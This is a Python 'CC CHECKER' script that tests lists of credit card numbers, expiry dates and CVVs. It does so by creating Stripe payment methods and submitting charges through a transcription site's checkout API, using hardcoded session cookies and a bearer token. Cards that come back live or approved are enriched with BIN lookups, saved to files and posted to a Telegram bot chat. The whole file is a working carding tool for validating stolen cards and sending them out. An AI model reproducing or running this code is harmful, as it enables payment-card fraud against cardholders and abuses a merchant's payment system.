import time

import pyfiglet

import requests

import webbrowser

import user_agent

webbrowser.open('https://t.me/isbank0')

logi = (pyfiglet.figlet_format('     CC CHECKER '))


print('\033[1;31m'+logi)


print('\033[1;30m='*60)


logq = (pyfiglet.figlet_format('    :)'))


print('\033[1;33m'+logq)


token = "6750520039:AAEE81PMfco19Abu4dbzGieFpwcwQ0kWrRI"

Id = "-1002118015145"


file = open('cc.txt', 'r').read().splitlines()


for i in file:


    cc = i.split('\n')[0]


    c = cc.split('|')[0]


    m = cc.split('|')[1]


    y = cc.split('|')[2]


    cv = cc.split('|')[3]


    def getkey():


        url = 'https://api.stripe.com/v1/payment_methods'


        head = {


        'accept': 'application/json',


        'accept-encoding': 'gzip, deflate, br',


        'accept-language': 'en,en-US;q=0.9,ar;q=0.8',


        'cache-control': 'no-cache',


        'content-length': '368',


        'content-type': 'application/x-www-form-urlencoded',


        'origin': 'https://js.stripe.com',


        'pragma': 'no-cache',


        'referer': 'https://js.stripe.com/',


        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',


        'sec-ch-ua-mobile': '?0',


        'sec-ch-ua-platform': '"Windows"',


        'sec-fetch-dest': 'empty',


        'sec-fetch-mode': 'cors',


        'sec-fetch-site': 'same-site',


        'user-agent': str(user_agent.generate_user_agent),


        }


        data = f'type=card&billing_details[name]=drjhyhjghdjhfjh+dfdfdf&card[number]={c}&card[cvc]={cv}&card[exp_month]={m}&card[exp_year]={y}&guid=NA&muid=8a1b8fbf-c986-4119-a63a-54f5eb137b8649eb01&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F445bde116e%3B+stripe-js-v3%2F445bde116e%3B+split-card-element&time_on_page=96120&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S'


        req = requests.post(url, headers=head, data=data)





        if 'id' in req.json():


            return req.json()['id']


        else:


            return 'ID'


    def kilstripe():


        cookies = {


            'ahoy_visitor': 'aed6f8b1-1d21-460d-a2d2-06f1f3b1d6e0',


            '_gcl_au': '1.1.126030997.1687104135',


            '_fbp': 'fb.1.1687104136908.898856357',


            '_lfa': 'LF1.1.c95b69089175f29b.1687104137941',


            'hubspotutk': '6386e5f1968bda4dbfeb2aa2e775be53',


            '_uetvid': '7e2949b00df111ee9e1b67cb597c737a',


            'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6IlcxczNOelUyTlRRMFhTd2lNbmxYUW5wNFYySkNVMHh0VEdZekxVeFRhbElpTENJeE5qZzNNVEEwTVRZMkxqVXdOek0zT1RnaVhRPT0iLCJleHAiOiIyMDIzLTA3LTAyVDE2OjAyOjQ2LjUwN1oiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ccdf112b02a05d6305b0b87361363fde8d7bec9f',


            'unsecure_is_signed_in': '1',


            'intercom-device-id-frdatdus': '3b061260-939e-498f-8323-6baff7e26422',


            '__stripe_mid': '8a1b8fbf-c986-4119-a63a-54f5eb137b8649eb01',


            'ahoy_visit': '4090416e-741c-472c-8717-f37472cc443b',


            '_gid': 'GA1.2.858391144.1687599217',


            '__hstc': '171462591.6386e5f1968bda4dbfeb2aa2e775be53.1687104141745.1687184702695.1687599222485.4',


            '__hssrc': '1',


            '_transcribe_session': 'OFaX7Y3iZbmzQFm9V9sol7z%2Fd7Y4MO5SqIy145UtzvWjTfz3hEx52McWa%2Bg%2BBwPGubnFTiAdnx8k%2FL6b9JACcoIFZn%2BebWgqILEJzLG6sTLSLbMe%2Fsb9FSw3HbVDyuQjImnQ2rWcRFoRlvxpHh%2B9rFSyqnMDFQsyv%2BL%2Bz2pa50K6X%2BLihyv2MrMX2QCj67KyILqoZIw5ia2BkER6APEcGYK4cymYKjrcpmkRQESgBA9Y7aMI2CR2dgnqzANWw9Ja8AlgAshlqkqeNHmPt4Za5xQyfqTlpcB6yHBdHSRdrnTCB7laZE4g%2Ff9GrpgzYjv6BJNRLOH1unY9twckJpJ0N%2BFA%2BHtftLiSuICWvNUldz41zfgOA9rtrvlkIC6a4niimIOsXoV6zJtEz6awg7kSR2M4lQ%3D%3D--Ne7LLajgi5Dhua%2Bw--TC6o07mK83cXMUcFIYu68w%3D%3D',


            '_ga': 'GA1.1.1376273022.1687104134',


            '_ga_4T8KCV9Y2D': 'GS1.1.1687599216.5.1.1687599248.28.0.0',


            '__hssc': '171462591.2.1687599222485',


            'intercom-session-frdatdus': 'ZlBIelVBU1U1aU1qUzNsdGQ2RHVmaVpiTUJ0K0kzVFF3aXpQQ3ZkRlF0SytRKzcyajUrZGdJcWtFc1J6TnZCMy0tMExvSHZUKytMVzg1a2VKRy92Rlpkdz09--76405ed3659f42abb7a0a40684c40815d6aa30f7',


            '__stripe_sid': '2f15c106-9c2c-4086-b1e4-29d51c9cd02c1c661d',


        }


        head = {


        'accept': 'application/json',


        'accept-encoding': 'gzip, deflate, br',


        'accept-language': 'en,en-US;q=0.9,ar;q=0.8',


        'authorization': 'Bearer Du9DAsrKpz1eQ7u91yIsrwtt',


        'cache-control': 'no-cache',


        'content-length': '428',


        'content-type': 'application/json',


        #'cookie': 'ahoy_visitor=aed6f8b1-1d21-460d-a2d2-06f1f3b1d6e0; _gcl_au=1.1.126030997.1687104135; _fbp=fb.1.1687104136908.898856357; _lfa=LF1.1.c95b69089175f29b.1687104137941; hubspotutk=6386e5f1968bda4dbfeb2aa2e775be53; intercom-device-id-frdatdus=3b061260-939e-498f-8323-6baff7e26422; __stripe_mid=8a1b8fbf-c986-4119-a63a-54f5eb137b8649eb01; _uetvid=7e2949b00df111ee9e1b67cb597c737a; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IlcxczNPVEU0TmpFMVhTd2lYMk54ZWpoMmVscDVObXRuZEdNeVJqaFdWRFFpTENJeE5qZzRNemswT0RZMExqTXpNek01TlRVaVhRPT0iLCJleHAiOiIyMDIzLTA3LTE3VDE0OjM0OjI0LjMzM1oiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--3898fb71128890792c6117d126c3ab99330eda31; unsecure_is_signed_in=1; __hstc=171462591.6386e5f1968bda4dbfeb2aa2e775be53.1687104141745.1688394842708.1688398356889.7; ahoy_visit=0c43f3af-6757-48b4-9bbc-3bc80f723449; _transcribe_session=L75azXNzL5ep4uRJkB55atJbkj6O99sJajnJvVzzbXXMglBeCXUrSG2n%2B5iFJaz6nY3FIiDE24PqVqlJSDPZRCkhUH%2FDWIEzhBXtNsechrD1r%2BNJag2%2BMaT93a7nvLxNIkhPUPkTjNC%2BrmYVhM5mni5HH4h3vMA3IUSZhgOsO7ThXgqM33VkATj338ODaTI43iU9Qq%2FWDhYHklv%2FpkIhbd3XSdN%2FkEA9u0riR4smokXy%2F6r9lm3BF%2FRoNSqkFQw1vGTEZuMi5mZI65H%2BjabHZRtTt5hXy3ZdWB1yZ%2BwbPhZSXWKdJbk3K6UuMHmHKHu0B4Yn8C%2B8hA46AQDsM9L4ySxzkKj7mWXRUn4v0%2BzQMk7BpNQyILTBbkiS%2Fr5w7pF75xjEswqTihvK6jc%2FkrLQq77jIQ%3D%3D--ZwZH923dBKJjWAUF--OhFVKgTotQrTHAQ35jtWfw%3D%3D; _gid=GA1.2.2021409511.1689250953; _ga=GA1.1.1376273022.1687104134; _ga_4T8KCV9Y2D=GS1.1.1689251000.12.0.1689251000.60.0.0',


        'origin': 'https://www.happyscribe.com',


        'pragma': 'no-cache',


        'referer': 'https://www.happyscribe.com/v2/7810988/checkout?plan=slider_prepaid&hours=1',


        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',


        'sec-ch-ua-mobile': '?0',


        'sec-ch-ua-platform': '"Windows"',


        'sec-fetch-dest': 'empty',


        'sec-fetch-mode': 'cors',


        'sec-fetch-site': 'same-origin',


        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',


        }


        data = {"id":"7490062","address":"137 Vesey Street","name":"drjhyhjghdjhfjh dfdfdf","country":"US","vat":"null","billing_account_id":"7490062","last4":"9574","orderReference":"ezgtmqzgo","user_id":"7918615","organization_id":"7810988","hours":"1","balance_increase_in_cents":"null","payment_method_id":getkey(),"transcription_id":"null","plan":"slider_prepaid","order_id":"null","recurrence_interval":"null","extra_plan_hours":"null"}


        req = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=head,json=data)


        try:


            if "Your card has insufficient funds." in req.json()['error']:


                api = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()


                try:


                    chh = api['scheme']


                    ch = chh.upper()


                except:


                    ch = 'False'


                try:


                    typ = api['type']


                    type = typ.upper()


                except:


                    type = 'False'


                try:


                    raa = api['brand']


                    ra = raa.upper()


                except:


                    ra = 'False'


                try:


                    am = api['bank']['name']


                    ame = am.upper()


                except:


                    ame = 'False'


                try:


                    co = api['country']['name']


                    cou = co


                except:


                    cou = 'False'


                try:


                    emoji = api['country']['emoji']


                except:


                    emoji = 'False'


                m = f'''


Live Card ✅


- - - - - - - - - - - - - - - - - - - - - - -


CC -> {cc}


Gateway -> Stripe


Response -> Kartınızda Yeterli Bakiye Yok.


- - - - - - - - - - - - - - - - - - - - - - -


Bin -> {cc[:6]}


Bin Info -> {ch} - {type} - {ra}


Bank -> {ame}


Counrty -> {cou} {emoji}


- - - - - - - - - - - - - - - - - - - - - - -


'''




                requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(Id)+"&text="+str(m))


                bolnam = 'visaok.txt'


                open(bolnam,'a').write('\n'+m)


                print(f'''\033[1;32m {m}''')


                time.sleep(10)


            else:


                print(f'''\033[1;31m{cc}''')


                time.sleep(10)


        except:


            if 'Retry later' in req.text:


                print(f'''\033[1;31m{cc} | Retry later''')


                time.sleep(10)


            elif 'requires_action' in req.json():


                requir = (f'''\033[1;33mLive 3D Secure = {cc}''')




                print(requir)


                requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(Id)+"&text="+str(requir))


                time.sleep(10)


            else:


                api = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()


                try:


                    chh = api['scheme']


                    ch = chh.upper()


                except:


                    ch = 'False'


                try:


                    typ = api['type']


                    type = typ.upper()


                except:


                    type = 'False'


                try:


                    raa = api['brand']


                    ra = raa.upper()


                except:


                    ra = 'False'


                try:


                    am = api['bank']['name']


                    ame = am.upper()


                except:


                    ame = 'False'


                try:


                    co = api['country']['name']


                    cou = co.upper()


                except:


                    cou = 'False'


                try:


                    emoji = api['country']['emoji']


                except:


                    emoji = 'False'


                m = f'''


Approved Card ✅


- - - - - - - - - - - - - - - - - - - - - - -


CC -> {cc}


Gateway -> Stripe


Response -> Ödeme Yapıldı Live.


- - - - - - - - - - - - - - - - - - - - - - -


Bin -> {cc[:6]}


Bin Info -> {ch} - {type} - {ra}


Bank -> {ame}


Counrty -> {cou} {emoji}


- - - - - - - - - - - - - - - - - - - - - - -


 '''




                requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(Id)+"&text="+str(m))
                bolnam = 'live.txt'


                open(bolnam,'a').write('\n'+m)
                print(f'''\033[1;32m{m}''')


                time.sleep(10)


    kilstripe()
